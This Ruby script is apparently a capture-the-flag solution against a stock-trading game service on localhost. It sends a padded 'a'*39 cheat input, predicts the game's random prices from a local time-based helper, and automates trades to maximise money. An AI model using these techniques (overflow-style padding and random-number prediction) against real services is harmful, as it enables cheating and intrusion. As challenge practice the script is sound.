require 'socket'

class Exploit
  def initialize
    @s = TCPSocket.new('localhost', 8081)
    @rands = `./time`.split("\n").map{|v| v.to_i(16)}
    puts @s.read("enter any cheat if you know of it ;-) : ".length)
    readline
    @s.write("a"*39+"\n")
    puts @s.readline
    puts @s.readline

    @n_prices = get_prices
    @first = true
    @money = 1000
    @buy_items = nil
    @final = false
  end

  def rand
    @rands.slice!(0)
  end

  def get_prices
    prices = [0] * 6
    item = rand % 6
    prop = rand % 100

    prices[0] = rand % 50 + 10
    prices[1] = rand % 180 + 70
    prices[2] = rand % 1100 + 400
    prices[3] = rand % 3500 + 1000
    prices[4] = rand % 9000 + 5000
    prices[5] = rand % 20000 + 15000

    if(prop <= 29)
      case(item)
      when 0
        puts "VLC changed"
        prices[0] = rand % 5 + 1
      when 1
        puts "PHP changed"
        prices[1] = rand % 900 + 350
      when 2
        puts "OpenSSL chnaged"
        prices[2] = rand % 110 + 40
      when 3
        puts "OS X changed"
        prices[3] = rand % 350 + 100
      when 4
        puts "GRSec changed"
        prices[4] = rand % 45000 + 25000
      when 5
        puts "Window10 changed"
        prices[5] = rand % 75000 + 75000
      end
    end

    prices
  end

  def find_buy_items
    puts "find_by_items : #{@c_prices.inspect}, #{@n_prices.inspect}"
    item = nil
    max = 0
    diff = 0

    6.times do |i|
      diff = @n_prices[i] - @c_prices[i]

      if(diff > 0 && max < diff && @money > @c_prices[i] )
        item = i
        max = diff
      end
    end

    return item
  end


  def update_prices
    @c_prices = @n_prices
    p @c_prices
    @n_prices = get_prices
  end

  def day
    puts "- Day begin"
    puts @s.readline
    puts @s.readline

    update_prices()

    puts "- After update price"

    while
      line = @s.readline
      puts line
      break if line.start_with?("PRICE CHART")
    end

    6.times { puts @s.readline }
    puts @s.readline

    puts "- After read banner"

    # payback
    if(@first)
     @s.write("3\n")
     puts @s.readline
     puts @s.write("1337\n")
     puts @s.readline
     @first = false
    end

    # sell item
    if(@buy_items)
      item, num = @buy_items
      @s.write("2\n")
      puts @s.readline
      @s.write("#{item + 1}\n")
      puts @s.readline
      @s.write("#{num}\n")
      print "==============================="
      puts @s.readline
    end

    item = find_buy_items()

    if(item)
      @s.write("1\n")
      puts @s.readline
      num = [@money / @c_prices[item], 100].min
      @s.write("#{item + 1}\n")
      puts @s.readline
      @s.write("#{num}\n")
      puts @s.readline
      num.times { puts @s.readline }
      @buy_items = [item, num]
      @money += (@n_prices[item] - @c_prices[item]) * num
    else
      @buy_items = nil
    end

    @s.write("5\n")
    puts @s.readline
#    readline
  end

  def set_final
    @final = false
  end

  def readall
    puts @s.readline
  end
end
s = Exploit.new
30.times { s.day }
s.readall
